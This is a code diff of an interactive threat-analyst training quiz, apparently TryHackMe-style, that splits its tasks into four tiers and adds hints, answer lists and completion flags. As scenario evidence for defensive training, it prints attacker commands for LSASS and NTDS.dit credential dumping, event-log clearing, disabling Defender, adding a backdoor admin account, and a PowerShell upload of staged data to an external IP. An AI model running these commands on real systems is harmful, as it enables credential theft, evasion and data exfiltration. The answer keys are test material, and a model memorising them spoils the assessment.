@@ -110,6 +110,41 @@
   .room-progress-bar { width: 140px; height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; }
   .room-progress-fill { height: 100%; background: var(--green); border-radius: 2px; transition: width 0.6s cubic-bezier(0.4,0,0.2,1); width: 0%; }
 
+  .room-tier-badge {
+    font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 0.12em;
+    padding: 0.2rem 0.6rem; border-radius: 3px; font-weight: 700;
+    border: 1px solid; display: inline-block; margin-bottom: 0.3rem;
+    transition: all 0.4s;
+  }
+  .tier-novice       { color: var(--green);  border-color: var(--green-dim);              background: rgba(57,211,83,0.08); }
+  .tier-intermediate { color: var(--blue);   border-color: rgba(88,166,255,0.3);          background: rgba(88,166,255,0.08); }
+  .tier-hard         { color: var(--yellow); border-color: rgba(227,179,65,0.35);         background: rgba(227,179,65,0.08); }
+  .tier-expert       { color: var(--red);    border-color: rgba(248,81,73,0.4);           background: rgba(248,81,73,0.1); }
+
+  .room-tier-track { display: flex; gap: 0.35rem; margin-top: 0.35rem; }
+  .tier-pip {
+    width: 22px; height: 22px; border-radius: 50%;
+    border: 1px solid var(--border-accent);
+    font-family: var(--font-mono); font-size: 0.6rem;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--text-dim); transition: all 0.4s;
+  }
+  .tier-pip.active  { border-color: var(--green); color: var(--green); background: rgba(57,211,83,0.1); }
+  .tier-pip.done    { border-color: var(--green); color: var(--green); background: rgba(57,211,83,0.2); }
+  .tier-pip[data-tier="1"].active { border-color: var(--blue);   color: var(--blue);   background: rgba(88,166,255,0.1); }
+  .tier-pip[data-tier="2"].active { border-color: var(--yellow); color: var(--yellow); background: rgba(227,179,65,0.1); }
+  .tier-pip[data-tier="3"].active { border-color: var(--red);    color: var(--red);    background: rgba(248,81,73,0.1); }
+
+  /* Hint system */
+  .hint-btn {
+    background: none; border: 1px solid var(--border-accent); color: var(--text-dim);
+    font-family: var(--font-mono); font-size: 0.68rem; padding: 0.25rem 0.6rem;
+    border-radius: 3px; cursor: pointer; transition: all 0.2s; margin-top: 0.5rem;
+  }
+  .hint-btn:hover { border-color: var(--yellow); color: var(--yellow); }
+  .hint-text { font-family: var(--font-mono); font-size: 0.75rem; color: var(--yellow); margin-top: 0.5rem; display: none; padding: 0.5rem 0.75rem; background: rgba(227,179,65,0.06); border: 1px solid rgba(227,179,65,0.2); border-radius: 4px; line-height: 1.5; }
+  .hint-text.show { display: block; }
+
   /* Task cards */
   .task-card { overflow: hidden; }
 
@@ -210,18 +245,18 @@
   <canvas id="completion-canvas"></canvas>
   <div class="completion-content">
     <div class="completion-badge-ring">✔</div>
-    <div class="completion-flag">ROOM COMPLETE</div>
-    <div class="completion-title">THREAT ACTOR ANALYST</div>
-    <div class="completion-sub">All TTP indicators successfully identified.<br>Room cleared — all tasks validated.</div>
+    <div class="completion-flag" id="completion-flag">TIER COMPLETE</div>
+    <div class="completion-title" id="completion-title">TIER CLEARED</div>
+    <div class="completion-sub" id="completion-sub">All tasks validated.</div>
     <div class="completion-typewriter" id="typewriter-text"></div>
     <div class="completion-stats">
-      <div class="cstat"><span class="cstat-val" id="stat-tasks">4/4</span><span class="cstat-label">Tasks</span></div>
+      <div class="cstat"><span class="cstat-val" id="stat-tasks">4/16</span><span class="cstat-label">Total Tasks</span></div>
       <div class="cstat"><span class="cstat-val" id="stat-score">100%</span><span class="cstat-label">Score</span></div>
       <div class="cstat"><span class="cstat-val" id="stat-time">—</span><span class="cstat-label">Time</span></div>
     </div>
     <div>
-      <button class="completion-btn secondary" onclick="resetRoom()">↺ Retry Room</button>
-      <button class="completion-btn" onclick="document.getElementById('completion-overlay').classList.remove('show')">✕ Close</button>
+      <button class="completion-btn secondary" id="retry-tier-btn" onclick="retryTier()">↺ Retry Tier</button>
+      <button class="completion-btn" id="next-tier-btn" onclick="advanceTier()">→ Next Tier</button>
     </div>
   </div>
 </div>
@@ -285,155 +320,321 @@
   <!-- SEQUENTIAL QUIZ ROOM -->
   <div class="section">
     <div class="section-title">TTP Analyst Room – Sequential Challenge</div>
-    <div class="room-terminal">
+    <div class="room-terminal" id="room-terminal">
 
       <div class="terminal-bar">
         <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
-        <span class="terminal-title">threat-actor-room.sh — sequential analyst competency check</span>
+        <span class="terminal-title" id="terminal-title">threat-actor-room.sh — tier 1: novice</span>
       </div>
 
       <div class="room-header">
         <div class="room-meta">
-          <div class="room-name">[ ROOM ] THREAT ACTOR TTP PROFILING</div>
-          <div class="room-desc">Answer each task correctly to unlock the next. Complete all 4 to clear the room.</div>
+          <div class="room-name" id="room-name">[ ROOM ] THREAT ACTOR TTP PROFILING — NOVICE</div>
+          <div class="room-desc" id="room-desc">Answer each task correctly to unlock the next. Complete all 4 to advance.</div>
         </div>
         <div class="room-progress-wrap">
+          <div class="room-tier-badge" id="room-tier-badge">NOVICE</div>
           <div class="room-progress-label" id="room-progress-label">0 / 4 Tasks</div>
           <div class="room-progress-bar"><div class="room-progress-fill" id="room-progress-fill"></div></div>
+          <div class="room-tier-track" id="room-tier-track">
+            <span class="tier-pip active" data-tier="0">N</span>
+            <span class="tier-pip" data-tier="1">I</span>
+            <span class="tier-pip" data-tier="2">H</span>
+            <span class="tier-pip" data-tier="3">E</span>
+          </div>
         </div>
       </div>
 
-      <div class="task-list">
+      <div class="task-list" id="task-list"></div>
 
-        <!-- TASK 1 — active -->
-        <div class="task-card active" id="task1">
-          <div class="task-lock-bar">Complete the previous task to unlock</div>
-          <div class="task-card-inner">
-            <div class="task-header">
-              <span class="task-num">TASK 1</span>
-              <span class="task-title">TTP Classification</span>
-              <span class="task-completed-badge">✔ SOLVED</span>
-            </div>
-            <div class="code-block">Technique: Credential Dumping
-MITRE ATT&CK ID: T1003
-Subtechnique: OS Credential Dumping
-Target Process: lsass.exe</div>
-            <div class="task-prompt">Which TTP category does credential dumping fall under?</div>
-            <div class="task-input-row">
-              <input class="task-input" id="input1" type="text" placeholder="Enter TTP category..." autocomplete="off" />
-              <button class="execute-btn" onclick="checkAnswer(1)">Execute</button>
-            </div>
-            <div class="task-feedback" id="feedback1"></div>
-          </div>
-        </div>
-
-        <!-- TASK 2 — locked -->
-        <div class="task-card locked" id="task2">
-          <div class="task-lock-bar">Complete Task 1 to unlock</div>
-          <div class="task-card-inner">
-            <div class="task-header">
-              <span class="task-num">TASK 2</span>
-              <span class="task-title">Ransomware Group Identification</span>
-              <span class="task-completed-badge">✔ SOLVED</span>
-            </div>
-            <div class="code-block">IOC: Encrypted extension → .lockbit
-Ransom Note: Restore-My-Files.txt
-Exfiltration: Stealbit tool observed
-Double Extortion: Yes — data leak site active</div>
-            <div class="task-prompt">Identify the ransomware group based on the above indicators:</div>
-            <div class="task-input-row">
-              <input class="task-input" id="input2" type="text" placeholder="Enter threat actor name..." autocomplete="off" />
-              <button class="execute-btn" onclick="checkAnswer(2)">Execute</button>
-            </div>
-            <div class="task-feedback" id="feedback2"></div>
-          </div>
-        </div>
-
-        <!-- TASK 3 — locked -->
-        <div class="task-card locked" id="task3">
-          <div class="task-lock-bar">Complete Task 2 to unlock</div>
-          <div class="task-card-inner">
-            <div class="task-header">
-              <span class="task-num">TASK 3</span>
-              <span class="task-title">Initial Access Vector</span>
-              <span class="task-completed-badge">✔ SOLVED</span>
-            </div>
-            <div class="code-block">Event ID: 4625 × 847 attempts | SourceIP: 185.220.101.45
-Event ID: 4624 | LogonType: 10 | Auth: NTLM
-Timestamp delta: 4625→4624 = 00:02:34
-Destination: SMB Port 445 lateral pivot observed</div>
-            <div class="task-prompt">What initial access technique is indicated by this telemetry?</div>
-            <div class="task-input-row">
-              <input class="task-input" id="input3" type="text" placeholder="Enter access technique..." autocomplete="off" />
-              <button class="execute-btn" onclick="checkAnswer(3)">Execute</button>
-            </div>
-            <div class="task-feedback" id="feedback3"></div>
-          </div>
-        </div>
-
-        <!-- TASK 4 — locked -->
-        <div class="task-card locked" id="task4">
-          <div class="task-lock-bar">Complete Task 3 to unlock</div>
-          <div class="task-card-inner">
-            <div class="task-header">
-              <span class="task-num">TASK 4</span>
-              <span class="task-title">Defense Evasion</span>
-              <span class="task-completed-badge">✔ SOLVED</span>
-            </div>
-            <div class="code-block">Commands observed:
-  cmd.exe /c wevtutil cl System
-  cmd.exe /c wevtutil cl Security
-  powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
-  reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware</div>
-            <div class="task-prompt">What MITRE ATT&amp;CK tactic category covers these observed behaviors?</div>
-            <div class="task-input-row">
-              <input class="task-input" id="input4" type="text" placeholder="Enter MITRE tactic..." autocomplete="off" />
-              <button class="execute-btn" onclick="checkAnswer(4)">Execute</button>
-            </div>
-            <div class="task-feedback" id="feedback4"></div>
-          </div>
-        </div>
-
-      </div>
     </div>
   </div>
 
 </div>
 
 <script>
-// ─── QUIZ ──────────────────────────────────────────────────────────────────────
-const answers = {
-  1: ['credential access','credentialaccess'],
-  2: ['lockbit','lockbit 3.0','lockbit3','lock bit'],
-  3: ['brute force','bruteforce','rdp brute force','password brute force','brute-force'],
-  4: ['defense evasion','defenseevasion','defense-evasion']
-};
+// ─── TIER DATA ────────────────────────────────────────────────────────────────
+const TIERS = [
+  {
+    id: 0, key: 'novice', label: 'NOVICE', tierClass: 'tier-novice', accent: '#39d353',
+    terminalLabel: 'threat-actor-room.sh — tier 1: novice',
+    roomName: '[ ROOM ] THREAT ACTOR TTP PROFILING — NOVICE',
+    roomDesc: 'Foundational TTP identification. Answer each task correctly to unlock the next.',
+    completionTitle: 'NOVICE TIER CLEARED',
+    completionSub: 'Foundational TTP knowledge validated. Advancing to Intermediate tier.',
+    completionFlag: 'THM{novice_ttp_analyst}',
+    nextLabel: 'INTERMEDIATE',
+    tasks: [
+      {
+        title: 'TTP Classification',
+        code: `Technique: Credential Dumping\nMITRE ATT&CK ID: T1003\nSubtechnique: OS Credential Dumping\nTarget Process: lsass.exe`,
+        prompt: 'Which MITRE ATT&CK tactic category does credential dumping fall under?',
+        placeholder: 'Enter tactic category...',
+        answers: ['credential access','credentialaccess'],
+        hint: null
+      },
+      {
+        title: 'Ransomware Group Identification',
+        code: `IOC: Encrypted extension → .lockbit\nRansom Note: Restore-My-Files.txt\nExfiltration: Stealbit tool observed\nDouble Extortion: Yes — data leak site active`,
+        prompt: 'Identify the ransomware group based on the above indicators:',
+        placeholder: 'Enter threat actor name...',
+        answers: ['lockbit','lockbit 3.0','lockbit3','lock bit'],
+        hint: null
+      },
+      {
+        title: 'Initial Access Vector',
+        code: `Event ID: 4625 × 847 attempts | SourceIP: 185.220.101.45\nEvent ID: 4624 | LogonType: 10 | Auth: NTLM\nTimestamp delta: 4625→4624 = 00:02:34`,
+        prompt: 'What initial access technique is indicated by this telemetry?',
+        placeholder: 'Enter access technique...',
+        answers: ['brute force','bruteforce','rdp brute force','brute-force'],
+        hint: null
+      },
+      {
+        title: 'Defense Evasion',
+        code: `cmd.exe /c wevtutil cl System\ncmd.exe /c wevtutil cl Security\npowershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"`,
+        prompt: 'What MITRE ATT&CK tactic category covers these observed behaviors?',
+        placeholder: 'Enter MITRE tactic...',
+        answers: ['defense evasion','defenseevasion','defense-evasion'],
+        hint: null
+      }
+    ]
+  },
+  {
+    id: 1, key: 'intermediate', label: 'INTERMEDIATE', tierClass: 'tier-intermediate', accent: '#58a6ff',
+    terminalLabel: 'threat-actor-room.sh — tier 2: intermediate',
+    roomName: '[ ROOM ] THREAT ACTOR TTP PROFILING — INTERMEDIATE',
+    roomDesc: 'Sub-technique IDs and multi-step attack reasoning. Hints available on request.',
+    completionTitle: 'INTERMEDIATE TIER CLEARED',
+    completionSub: 'Attack chain reasoning validated. Advancing to Hard tier.',
+    completionFlag: 'THM{intermediate_chain_analyst}',
+    nextLabel: 'HARD',
+    tasks: [
+      {
+        title: 'Sub-Technique Identification',
+        code: `Tactic: Credential Access\nTechnique: T1003\nObservation: procdump.exe -ma lsass.exe lsass.dmp\nEvent ID: 4688 — Process Created`,
+        prompt: 'What is the MITRE ATT&CK sub-technique ID for LSASS memory dumping via a utility?',
+        placeholder: 'Enter sub-technique ID (T1003.xxx)...',
+        answers: ['t1003.001','1003.001'],
+        hint: 'Look at T1003 sub-techniques. This one specifically targets the LSASS process memory.'
+      },
+      {
+        title: 'Persistence Mechanism',
+        code: `Registry Key Modified:\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nValue: Userinit → C:\\Windows\\system32\\userinit.exe,malware.exe\nEvent ID: 4657 — Registry value modified`,
+        prompt: 'What persistence sub-technique does this registry modification represent?',
+        placeholder: 'Enter sub-technique ID (T1547.xxx)...',
+        answers: ['t1547.004','1547.004'],
+        hint: 'This modifies the Winlogon key — a classic Windows boot or logon autostart sub-technique.'
+      },
+      {
+        title: 'Lateral Movement Method',
+        code: `Source Host: WS-01 (192.168.1.101)\nDest Host:   WS-02 (192.168.1.102)\nProtocol: SMB — Port 445\nShare Accessed: \\\\WS-02\\ADMIN$\nPayload Dropped: \\ADMIN$\\svc_update.exe\nEvent ID: 7045 on destination host`,
+        prompt: 'What MITRE ATT&CK technique ID describes this SMB-based lateral execution method?',
+        placeholder: 'Enter technique ID (T1xxx.xxx)...',
+        answers: ['t1021.002','1021.002'],
+        hint: 'This uses SMB and admin shares to move laterally — look at T1021 sub-techniques for remote services.'
+      },
+      {
+        title: 'Exfiltration Channel',
+        code: `Process: powershell.exe\nCommand: Invoke-WebRequest -Uri "https://185.220.101.45/upload" -Method POST -InFile C:\\staged\\data.zip\nOutbound: HTTPS POST — large payload — external IP\nDNS: No lookup (direct IP)`,
+        prompt: 'What MITRE ATT&CK technique describes this data exfiltration over an encrypted web channel?',
+        placeholder: 'Enter technique ID (T1xxx.xxx)...',
+        answers: ['t1041','1041','t1048','1048','t1048.002','1048.002'],
+        hint: 'Data is being sent out over an encrypted C2 channel. Check T1041 (Exfiltration Over C2 Channel).'
+      }
+    ]
+  },
+  {
+    id: 2, key: 'hard', label: 'HARD', tierClass: 'tier-hard', accent: '#e3b341',
+    terminalLabel: 'threat-actor-room.sh — tier 3: hard',
+    roomName: '[ ROOM ] THREAT ACTOR TTP PROFILING — HARD',
+    roomDesc: 'Raw log analysis and threat group attribution from TTPs alone. Think carefully.',
+    completionTitle: 'HARD TIER CLEARED',
+    completionSub: 'Advanced attribution and log forensics validated. Final tier unlocked.',
+    completionFlag: 'THM{hard_attribution_analyst}',
+    nextLabel: 'EXPERT',
+    tasks: [
+      {
+        title: 'Log Sequence Attribution',
+        code: `[08:14:22] 4625 FAILED  — user: admin       src: 45.33.32.156\n[08:14:23] 4625 FAILED  — user: admin       src: 45.33.32.156\n[08:14:31] 4624 SUCCESS — user: admin       src: 45.33.32.156  type:10\n[08:15:02] 4688 CREATED — svchost.exe spawned by cmd.exe\n[08:15:04] 4688 CREATED — cmd.exe /c "net user backdoor P@ss123 /add"\n[08:15:05] 4688 CREATED — cmd.exe /c "net localgroup administrators backdoor /add"`,
+        prompt: 'What two-phase attack sequence is represented by this log chain? (format: X then Y)',
+        placeholder: 'e.g. brute force then privilege escalation...',
+        answers: ['brute force then privilege escalation','bruteforce then privilege escalation','rdp brute force then privilege escalation','brute force then privesc','bruteforce then privesc'],
+        hint: 'Phase 1: multiple 4625 failures → one 4624 success. Phase 2: new admin user created via net commands.'
+      },
+      {
+        title: 'Threat Group Attribution',
+        code: `IOCs observed during incident:\n  • Initial access via spear-phishing with ISO attachments\n  • Cobalt Strike Beacon deployed post-access\n  • BazarLoader used as second-stage dropper\n  • Ryuk ransomware deployed after ~3 day dwell time\n  • Lateral movement via domain admin credential abuse\n  • Shadow copies deleted via vssadmin`,
+        prompt: 'Based on these TTPs, tools, and dwell time, which threat group is most likely responsible?',
+        placeholder: 'Enter threat actor / group name...',
+        answers: ['wizard spider','wizardspider','unc1878','temp.mixmaster'],
+        hint: 'BazarLoader + Cobalt Strike + Ryuk is a well-documented toolkit chain. Search for the group behind Ryuk deployments using this exact chain.'
+      },
+      {
+        title: 'C2 Beaconing Pattern',
+        code: `Outbound DNS queries — host: DESKTOP-4F2A1\n  185.220.101.45   intervals: 59s, 61s, 60s, 58s, 60s\n  185.220.101.45   query type: A  TTL: 5s (suspiciously low)\n  No legitimate domain — direct IP C2 beacon pattern\n  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) [static, never changes]`,
+        prompt: 'What C2 evasion technique does the regular beacon interval and static user-agent string indicate?',
+        placeholder: 'Enter technique name or ID...',
+        answers: ['masquerading','t1036','protocol impersonation','web protocols','t1071.001','1071.001','t1071','1071','traffic signaling','scheduled transfer'],
+        hint: 'The static user-agent and regular intervals suggest the C2 is disguising itself as legitimate browser traffic. Think T1071 sub-techniques.'
+      },
+      {
+        title: 'Anti-Forensics Sequence',
+        code: `Forensic artefacts detected post-incident:\n  • $MFT entries show file creation but no file present\n  • Prefetch files for malware.exe missing despite execution evidence\n  • USN Journal entries deleted\n  • Event logs cleared: System, Security, Application\n  • Timestomping detected on dropped files (MACE timestamps = 2000-01-01)`,
+        prompt: 'What overarching MITRE ATT&CK tactic encompasses all of these post-compromise behaviours?',
+        placeholder: 'Enter MITRE tactic name...',
+        answers: ['defense evasion','defense-evasion','defenseevasion'],
+        hint: 'All actions here — log clearing, timestomping, prefetch deletion — are designed to make detection and investigation harder.'
+      }
+    ]
+  },
+  {
+    id: 3, key: 'expert', label: 'EXPERT', tierClass: 'tier-expert', accent: '#f85149',
+    terminalLabel: 'threat-actor-room.sh — tier 4: expert [FINAL]',
+    roomName: '[ ROOM ] THREAT ACTOR TTP PROFILING — EXPERT',
+    roomDesc: 'Elite-level multi-indicator scenarios. Distinguish between similar threat groups. No margin for error.',
+    completionTitle: 'ELITE ANALYST',
+    completionSub: 'All four tiers cleared. Expert-level threat actor proficiency confirmed.',
+    completionFlag: 'THM{elite_threat_actor_analyst_certified}',
+    nextLabel: null,
+    tasks: [
+      {
+        title: 'Threat Group Differentiation',
+        code: `Incident A:\n  • Initial access: RDP brute force\n  • Encryptor: .hive extension\n  • Note: YOUR NETWORK HAS BEEN HACKED\n  • Exfil tool: Rclone\n  • Affiliate model: RaaS\n\nIncident B:\n  • Initial access: RDP brute force  \n  • Encryptor: .locked extension\n  • Note: All your files are encrypted\n  • Exfil tool: MEGAsync\n  • Affiliate model: RaaS`,
+        prompt: 'Identify the ransomware group responsible for Incident A based on its specific IOCs:',
+        placeholder: 'Enter group name for Incident A...',
+        answers: ['hive','hive ransomware'],
+        hint: 'Focus on the encrypted file extension and ransom note phrasing. The .hive extension and "YOUR NETWORK HAS BEEN HACKED" note are unique to one group.'
+      },
+      {
+        title: 'Diamond Model Attribution',
+        code: `Adversary:    Unknown — suspected nation-state\nCapability:   Custom implant — "GrimAgent" dropper\n              Cobalt Strike Beacon (modified malleable C2)\nInfrastructure: Bulletproof hosting — AS209588\n                Domains registered via Namecheap, privacy protected\nVictimology:  Energy sector targets — Eastern Europe\nTTP overlap:  T1566.001, T1059.001, T1055.012, T1486`,
+        prompt: 'Using the Diamond Model, which attribute links this actor most strongly to a nation-state classification?',
+        placeholder: 'Enter Diamond Model attribute...',
+        answers: ['adversary','infrastructure','capability','victimology','infrastructure and victimology','adversary capability'],
+        hint: 'The Diamond Model has four attributes: Adversary, Capability, Infrastructure, Victimology. Nation-state classification relies most heavily on targeting patterns and infrastructure sophistication.'
+      },
+      {
+        title: 'Malware Family Chain',
+        code: `Timeline of execution on compromised host:\n  T+0:00  phishing email opened — ISO mounted\n  T+0:03  wscript.exe executes LNK file → BumbleBee loader\n  T+0:08  BumbleBee injects into svchost.exe\n  T+0:15  Cobalt Strike Beacon established — C2: 195.123.240.x\n  T+1:42  Mimikatz executed — NTDS.dit extracted\n  T+3:10  BlackCat/ALPHV encryptor deployed domain-wide`,
+        prompt: 'What is the name of the initial access malware loader used at T+0:03 in this infection chain?',
+        placeholder: 'Enter malware family name...',
+        answers: ['bumblebee','bumble bee','bumblebee loader'],
+        hint: 'This loader was first observed in 2022 as a replacement for BazarLoader by some threat actors. It is named after a flying insect.'
+      },
+      {
+        title: 'NTDS Extraction Technique',
+        code: `Commands executed on Domain Controller:\n  cmd /c ntdsutil "ac i ntds" "ifm" "create full C:\\temp\\dump" q q\n  \n  Result: C:\\temp\\dump\\Active Directory\\ntds.dit\n           C:\\temp\\dump\\registry\\SYSTEM\n\n  Followed by exfiltration of both files via SFTP to 45.33.32.156`,
+        prompt: 'What specific MITRE ATT&CK sub-technique ID describes this NTDS.dit extraction method using ntdsutil?',
+        placeholder: 'Enter sub-technique ID (T1003.xxx)...',
+        answers: ['t1003.003','1003.003'],
+        hint: 'This is a T1003 sub-technique. The ntdsutil "ifm" (Install From Media) method specifically targets the Active Directory database file.'
+      }
+    ]
+  }
+];
 
-let completed = new Set();
+// ─── ROOM STATE ───────────────────────────────────────────────────────────────
+let currentTier = 0;
+let completedTasks = new Set();
 let startTime = Date.now();
+let tierStartTime = Date.now();
 
-function normalize(s) { return s.toLowerCase().replace(/[^a-z0-9 ]/g,'').trim(); }
+const tierColors = ['#39d353','#58a6ff','#e3b341','#f85149'];
 
+function normalize(s) { return s.toLowerCase().replace(/[^a-z0-9.+ ]/g,'').trim(); }
+
+// ─── RENDER TIER ──────────────────────────────────────────────────────────────
+function renderTier(tierIdx) {
+  const tier = TIERS[tierIdx];
+  completedTasks.clear();
+  tierStartTime = Date.now();
+
+  // Update header UI
+  document.getElementById('terminal-title').textContent = tier.terminalLabel;
+  document.getElementById('room-name').textContent = tier.roomName;
+  document.getElementById('room-desc').textContent = tier.roomDesc;
+
+  const badge = document.getElementById('room-tier-badge');
+  badge.textContent = tier.label;
+  badge.className = `room-tier-badge ${tier.tierClass}`;
+
+  // Update progress bar colour
+  document.getElementById('room-progress-fill').style.background = tier.accent;
+  document.getElementById('room-progress-fill').style.width = '0%';
+  document.getElementById('room-progress-label').textContent = '0 / 4 Tasks';
+
+  // Update tier pips
+  document.querySelectorAll('.tier-pip').forEach(pip => {
+    const t = parseInt(pip.dataset.tier);
+    pip.className = 'tier-pip';
+    if (t < tierIdx) pip.classList.add('done');
+    else if (t === tierIdx) pip.classList.add('active');
+  });
+
+  // Render task cards
+  const list = document.getElementById('task-list');
+  list.innerHTML = tier.tasks.map((task, i) => {
+    const n = i + 1;
+    const hasHint = !!task.hint;
+    return `
+      <div class="task-card ${n === 1 ? 'active' : 'locked'}" id="task${n}">
+        <div class="task-lock-bar">Complete Task ${n-1} to unlock</div>
+        <div class="task-card-inner">
+          <div class="task-header">
+            <span class="task-num" style="color:${tier.accent};border-color:${tier.accent}40;background:${tier.accent}12">TASK ${n}</span>
+            <span class="task-title">${task.title}</span>
+            <span class="task-completed-badge">✔ SOLVED</span>
+          </div>
+          <div class="code-block">${task.code.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+          <div class="task-prompt">${task.prompt}</div>
+          <div class="task-input-row">
+            <input class="task-input" id="input${n}" type="text" placeholder="${task.placeholder}" autocomplete="off" />
+            <button class="execute-btn" onclick="checkAnswer(${n})" style="--exec-hover:${tier.accent}">Execute</button>
+          </div>
+          <div class="task-feedback" id="feedback${n}"></div>
+          ${hasHint ? `<button class="hint-btn" onclick="toggleHint(${n})">💡 Hint</button><div class="hint-text" id="hint${n}">${task.hint}</div>` : ''}
+        </div>
+      </div>`;
+  }).join('');
+
+  // Bind enter keys
+  tier.tasks.forEach((_, i) => {
+    const n = i + 1;
+    document.getElementById(`input${n}`).addEventListener('keydown', e => {
+      if (e.key === 'Enter') checkAnswer(n);
+    });
+  });
+}
+
+function toggleHint(n) {
+  const el = document.getElementById(`hint${n}`);
+  el.classList.toggle('show');
+}
+
+// ─── ANSWER CHECKING ──────────────────────────────────────────────────────────
 function checkAnswer(n) {
+  const tier = TIERS[currentTier];
+  const task = tier.tasks[n - 1];
   const input = document.getElementById(`input${n}`);
   const feedback = document.getElementById(`feedback${n}`);
   const val = normalize(input.value);
   if (!val) return;
 
-  if (answers[n].includes(val)) {
+  if (task.answers.includes(val)) {
     input.classList.remove('wrong');
     input.disabled = true;
     document.querySelector(`#task${n} .execute-btn`).disabled = true;
     feedback.textContent = '✔ Correct. Advancing...';
     feedback.className = 'task-feedback feedback-correct';
-    completed.add(n);
+    feedback.style.color = tier.accent;
+    completedTasks.add(n);
 
     setTimeout(() => {
       document.getElementById(`task${n}`).classList.remove('active');
       document.getElementById(`task${n}`).classList.add('completed');
       updateProgress();
       if (n < 4) unlockTask(n + 1);
-      else triggerCompletion();
+      else triggerTierComplete();
     }, 700);
 
   } else {
@@ -446,11 +647,10 @@ function checkAnswer(n) {
 
 function unlockTask(n) {
   const card = document.getElementById(`task${n}`);
-  // Remove locked (display:none) first, then trigger animation on next frame
   card.classList.remove('locked');
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
-      card.classList.add('active', 'unlocking');
+      card.classList.add('active','unlocking');
       setTimeout(() => card.classList.remove('unlocking'), 800);
     });
   });
@@ -461,76 +661,104 @@ function unlockTask(n) {
 }
 
 function updateProgress() {
-  const c = completed.size;
+  const c = completedTasks.size;
   document.getElementById('room-progress-label').textContent = `${c} / 4 Tasks`;
   document.getElementById('room-progress-fill').style.width = `${(c/4)*100}%`;
 }
 
-document.querySelectorAll('.task-input').forEach((el, i) => {
-  el.addEventListener('keydown', e => { if (e.key === 'Enter') checkAnswer(i+1); });
-});
-
-function resetRoom() {
-  completed.clear();
-  startTime = Date.now();
-  document.getElementById('completion-overlay').classList.remove('show');
-  for (let i = 1; i <= 4; i++) {
-    const card = document.getElementById(`task${i}`);
-    const input = document.getElementById(`input${i}`);
-    const feedback = document.getElementById(`feedback${i}`);
-    const btn = card.querySelector('.execute-btn');
-    input.value = ''; input.disabled = false; input.className = 'task-input';
-    feedback.textContent = ''; feedback.className = 'task-feedback';
-    btn.disabled = false; btn.style.display = '';
-    // Task 1 starts active, all others hidden (locked)
-    card.className = 'task-card' + (i === 1 ? ' active' : ' locked');
-  }
-  updateProgress();
-}
-
-// ─── COMPLETION ────────────────────────────────────────────────────────────────
-function triggerCompletion() {
-  const elapsed = Math.round((Date.now() - startTime) / 1000);
+// ─── TIER COMPLETION ─────────────────────────────────────────────────────────
+function triggerTierComplete() {
+  const tier = TIERS[currentTier];
+  const elapsed = Math.round((Date.now() - tierStartTime) / 1000);
   const mins = Math.floor(elapsed / 60);
   const secs = (elapsed % 60).toString().padStart(2,'0');
+
   document.getElementById('stat-time').textContent = `${mins}m${secs}s`;
+  document.getElementById('completion-title').textContent = tier.completionTitle;
+  document.getElementById('completion-sub').textContent = tier.completionSub;
+  document.getElementById('completion-flag').textContent = tier.completionFlag;
+
+  const isLast = currentTier === TIERS.length - 1;
+  const nextBtn = document.getElementById('next-tier-btn');
+  const retryBtn = document.getElementById('retry-tier-btn');
+
+  if (isLast) {
+    nextBtn.textContent = '✔ All Tiers Cleared';
+    nextBtn.disabled = true;
+    nextBtn.style.opacity = '0.5';
+    document.getElementById('completion-title').textContent = '🏆 ELITE ANALYST';
+    document.getElementById('stat-tasks').textContent = '16/16';
+  } else {
+    nextBtn.textContent = `→ Advance to ${tier.nextLabel}`;
+    nextBtn.disabled = false;
+    nextBtn.style.opacity = '1';
+    document.getElementById('stat-tasks').textContent = `${(currentTier + 1) * 4}/16`;
+  }
+
+  retryBtn.textContent = `↺ Retry ${tier.label}`;
+
   setTimeout(() => {
     document.getElementById('completion-overlay').classList.add('show');
-    startParticles();
-    startTypewriter();
+    startParticles(tier.accent);
+    startTypewriter(tier);
   }, 500);
 }
 
-const typewriterLines = [
-  'All threat actor indicators identified.',
-  'TTP mapping complete — MITRE ATT&CK validated.',
-  'Room flag: THM{ttp_analyst_certified}'
-];
+function advanceTier() {
+  if (currentTier >= TIERS.length - 1) return;
+  currentTier++;
+  document.getElementById('completion-overlay').classList.remove('show');
+  // Brief pause then transition
+  setTimeout(() => {
+    document.getElementById('task-list').style.opacity = '0';
+    document.getElementById('task-list').style.transform = 'translateY(-8px)';
+    setTimeout(() => {
+      renderTier(currentTier);
+      document.getElementById('task-list').style.transition = 'opacity 0.4s, transform 0.4s';
+      document.getElementById('task-list').style.opacity = '1';
+      document.getElementById('task-list').style.transform = 'translateY(0)';
+      document.getElementById('room-terminal').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }, 300);
+  }, 300);
+}
 
-function startTypewriter() {
+function retryTier() {
+  document.getElementById('completion-overlay').classList.remove('show');
+  setTimeout(() => { renderTier(currentTier); }, 300);
+}
+
+// ─── COMPLETION ANIMATION ────────────────────────────────────────────────────
+const typewriterSets = {
+  0: ['Foundational TTP knowledge confirmed.', 'MITRE ATT&CK tactic mapping: complete.', 'Tier flag: THM{novice_ttp_analyst}'],
+  1: ['Sub-technique identification: validated.', 'Attack chain reasoning: confirmed.', 'Tier flag: THM{intermediate_chain_analyst}'],
+  2: ['Log forensics and attribution: verified.', 'Advanced threat profiling: complete.', 'Tier flag: THM{hard_attribution_analyst}'],
+  3: ['All four tiers cleared. Elite status achieved.', 'Full spectrum TTP proficiency confirmed.', 'Flag: THM{elite_threat_actor_analyst_certified}']
+};
+
+function startTypewriter(tier) {
+  const lines = typewriterSets[tier.id];
   const el = document.getElementById('typewriter-text');
   let li = 0, ci = 0;
   el.textContent = '';
   function type() {
-    if (li >= typewriterLines.length) return;
-    const line = typewriterLines[li];
+    if (li >= lines.length) return;
+    const line = lines[li];
     if (ci < line.length) {
       el.textContent = line.slice(0, ci + 1);
       ci++;
-      setTimeout(type, 42);
+      setTimeout(type, 40);
